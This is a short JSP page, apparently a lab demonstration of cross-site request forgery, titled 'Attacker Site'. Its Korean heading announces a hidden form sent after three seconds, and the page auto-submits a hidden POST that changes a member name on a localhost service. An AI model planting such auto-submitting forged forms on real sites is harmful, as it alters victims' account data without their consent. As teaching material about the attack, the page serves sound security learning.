<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Attacker Site</title>
</head>
<body>
<div id="wrap">
    <h1>악성 페이지 - 3초 뒤 숨겨진 폼(form) 전송</h1>
    <form action="http://localhost:8081/change" method="POST">
        <input type="hidden" id="memberName" name="memberName" value="JunhyunnyChangedByFormSubmit"/>
    </form>
    <script>
        setTimeout(function () {
            document.forms[0].submit();
        }, 3000);
    </script>
</div>
</body>
</html>